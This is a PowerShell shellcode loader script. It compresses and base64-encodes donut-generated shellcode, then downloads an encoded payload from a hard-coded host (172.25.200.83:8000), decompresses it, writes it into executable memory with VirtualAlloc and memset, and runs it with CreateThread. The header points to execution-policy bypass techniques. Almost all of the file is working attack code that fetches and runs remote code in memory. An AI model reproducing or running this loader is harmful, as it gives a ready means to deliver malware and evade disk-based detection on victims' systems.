#Powershell script that can compress and decompress shellcode...
# https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/
# Set-ExecutionPolicy Bypass -Scope Process

function Get-CompressedShellcode
{
	[CmdletBinding()]
	Param([String]$inFile,[String]$outFile)

	$byteArray = [System.IO.File]::ReadAllBytes($inFile)
	#Write-Verbose "Get-CompressedByteArray"
	[System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream
	$gzipStream = New-Object System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
	$gzipStream.Write( $byteArray, 0, $byteArray.Length )
	$gzipStream.Close()
	$output.Close()
	$tmp = $output.ToArray()
	$b64 = [System.Convert]::ToBase64String($tmp)
	[System.IO.File]::WriteAllText($outFile, $b64)
}

function Get-DecompressedShellcode
{
	[CmdletBinding()]
	Param([String]$inFile,[String]$outFile)
	$string = [System.IO.File]::ReadAllText($inFile)
	$byteArray = [System.Convert]::FromBase64String($string)
	#$byteArray = [System.IO.File]::ReadAllBytes($inFile)
	Write-Verbose "Get-DecompressedByteArray"

	$input = New-Object System.IO.MemoryStream( , $byteArray)
	$output = New-Object System.IO.MemoryStream

	$gzipStream = New-Object System.IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress)
	$gzipStream.CopyTo($output)
	$gzipStream.Close()
	$input.Close()
	$tmp = $output.ToArray()

	#$b64 = [System.Convert]::ToBase64String($tmp)
	#[System.IO.File]::WriteAllText($outFile, $tmp)
	[System.IO.File]::WriteAllBytes($outFile, $tmp)
}

# After using donut on an executable to create loader.bin
# ./donut.bin -i executeCalc
#Get-CompressedShellcode -inFile c:\shares\files\loader.bin -outFile c:\shares\files\loader.b64

#Get-DecompressedShellcode -inFile C:\shares\files\loader.b64 -outFile C:\shares\files\loader2.bin

#Powershell script to Download, Base64 Decode, Decompress and load the shellcode; then execute
#Does seem to crash the process after it loads, depending on the shellcode if it exits...

function Get-DecompressedShellcode($url)
{
    #[CmdletBinding()]
    #Param([String]$inFile)

    $download = Invoke-WebRequest -Uri $url -UseBasicParsing
    #$string = [System.IO.File]::ReadAllText($inFile)
    $byteArray = [System.Convert]::FromBase64String($download)
    #$byteArray = [System.IO.File]::ReadAllBytes($inFile)
    Write-Verbose "Get-DecompressedByteArray"

    $input = New-Object System.IO.MemoryStream( , $byteArray)
    $output = New-Object System.IO.MemoryStream

    $gzipStream = New-Object System.IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress)
    $gzipStream.CopyTo($output)
    $gzipStream.Close()
    $input.Close()
    $tmp = $output.ToArray()

    return $tmp
    #$b64 = [System.Convert]::ToBase64String($tmp)
    #[System.IO.File]::WriteAllText($outFile, $tmp)
    #[System.IO.File]::WriteAllBytes($outFile, $tmp)
}

function Get-MemoryExec($url) {
    $code = '
	[DllImport("kernel32.dll")]
	public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

	[DllImport("kernel32.dll")]
	public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

	[DllImport("msvcrt.dll")]
	public static extern IntPtr memset(IntPtr dest, uint src, uint count);'

    $winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

    #$bytes = [System.IO.File]::ReadAllBytes("c:\shares\files\loader.bin");
    $bytes = Get-DecompressedShellcode($url)
    [Byte[]]$sc = $bytes

    $size = 0x1000
    if ($sc.Length -gt 0x1000) {$size = $sc.Length}

    $x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40)
    for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt64()+$i), $sc[$i], 1) | Out-Null}
    $winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 }
}

# A self-hosted ptyhon3 http.server
Get-MemoryExec -url "http://172.25.200.83:8000/loader.b64"
